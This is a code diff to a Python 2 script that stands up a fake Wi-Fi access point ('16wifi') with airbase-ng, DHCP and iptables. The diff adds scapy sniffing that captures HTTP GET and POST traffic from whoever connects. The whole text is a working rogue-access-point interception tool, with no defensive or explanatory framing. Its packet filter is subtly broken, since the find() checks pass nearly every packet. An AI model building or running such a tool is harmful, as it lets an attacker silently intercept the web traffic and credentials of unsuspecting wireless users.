@@ -1,8 +1,9 @@
 #!/usr/bin/env python
 
+import scapy.all as scapy
+import scapy_http.http
 import subprocess
 import threading
-import argparse
 import socket
 import signal
 import struct
@@ -15,11 +16,11 @@ DN = open(os.devnull, 'w')
 
 def get_isc_dhcp_server():
 	if not os.path.isfile('/usr/sbin/dhcpd'):
-			install = raw_input('[log]  isc-dhcp-server not found in /usr/sbin/dhcpd, install now? [y/n] ')
+			install = raw_input('[*]  isc-dhcp-server not found in /usr/sbin/dhcpd, install now? [y/n] ')
 			if install == 'y':
 				os.system('apt-get -y install isc-dhcp-server')
 			else:
-				sys.exit('[log] isc-dhcp-server not found in /usr/sbin/dhcpd')
+				sys.exit('[*] isc-dhcp-server not found in /usr/sbin/dhcpd')
 
 def iwconfig():
 	monitors = []
@@ -63,7 +64,7 @@ def internet_info(interfaces):
 	if inet_iface:
 		return inet_iface, ipprefix
 	else:
-		sys.exit('[log] No active internet connection found. Exiting')
+		sys.exit('[*] No active internet connection found. Exiting')
 
 def AP_iface(interfaces, inet_iface):
 	useable_iface = []
@@ -109,8 +110,9 @@ def get_mon_mac(mon_iface):
 def start_ap(mon_iface, channel, essid):
 	print '[*] Starting the fake access point...'
 	try:
-		subprocess.Popen(['airbase-ng', '-P', '-Z', '4', '-W', '1', '-c', channel, '-e', essid, '-v', mon_iface, '-F', 'fakeAPlog'], stdout=DN, stderr=DN)
-		time.sleep(6) # Copied from Pwnstar which said it was necessary?
+		subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid, mon_iface], stdout=DN, stderr=DN)
+		print '[*] Waiting for 7 seconds...'
+		time.sleep(7) # Copied from Pwnstar which said it was necessary?
 	except KeyboardInterrupt:
 		cleanup(None, None)
 	subprocess.Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
@@ -142,10 +144,10 @@ def dhcp_conf(ipprefix):
 	if ipprefix == '19' or ipprefix == '17':
 		with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
 			# subnet, range, router, dns
-			dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '8.8.8.8'))
+			dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '114.114.114.114'))
 	elif ipprefix == '10':
 		with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
-			dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '8.8.8.8'))
+			dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '114.114.114.114'))
 	return '/tmp/dhcpd.conf'
 
 def dhcp(dhcpconf, ipprefix):
@@ -155,6 +157,11 @@ def dhcp(dhcpconf, ipprefix):
 		os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
 	else:
 		os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')
+
+def http_header(packet):
+	http_packet=str(packet)
+	if http_packet.find('GET') or http_packet.find('POST'):
+		return http_packet
 
 if __name__ == "__main__":
 
@@ -179,16 +186,16 @@ if __name__ == "__main__":
 
 	# can not find any useable ap_iface
 	if not ap_iface:
-		sys.exit('[log] Found internet connected interface in '+inet_iface+'. Please bring up a wireless interface to use as the fake access point.')
+		sys.exit('[*] Found internet connected interface in '+inet_iface+'. Please bring up a wireless interface to use as the fake access point.')
 
 	# set iptables firewall
 	ipf = iptables(inet_iface)
 
-	print '[log] Cleared leases, started DHCP, set up iptables'
+	print '[*] Cleared leases, started DHCP, set up iptables'
 
 	userSetAp = ap_iface[0]
-	userSetChannel = '1'
-	fadeESSID = 'Free wifi'
+	userSetChannel = '6'
+	fadeESSID = '16wifi'
 
 	# get monitor iface
 	mon_iface = start_monitor(userSetAp,userSetChannel)
@@ -202,15 +209,18 @@ if __name__ == "__main__":
 	dhcpconf = dhcp_conf(ipprefix)
 	dhcp(dhcpconf, ipprefix)
 
+	# os.system('clear')
+	print '[*] '+fadeESSID+' set up on channel '+userSetChannel+' via '+mon_iface+' on '+userSetAp
+
 	while 1:
 		signal.signal(signal.SIGINT, cleanup)
-		os.system('clear')
-		print '[*] '+fadeESSID+' set up on channel '+userSetChannel+' via '+mon_iface+' on '+userSetAp
-		print '\nDHCP leases log file:'
-		proc = subprocess.Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=subprocess.PIPE, stderr=DN)
-		for line in proc.communicate()[0].split('\n'):
-			print line
-		time.sleep(1)
+		pkts = scapy.sniff(iface="at0",filter = "tcp",prn=http_header)
+		
+		print len(pkts)
+		# print '\nDHCP leases log file:'
+		# proc = subprocess.Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=subprocess.PIPE, stderr=DN)
+		# for line in proc.communicate()[0].split('\n'):
+		# 	print line
 
 	# app = web.application(urls,globals())
 	# app.run()
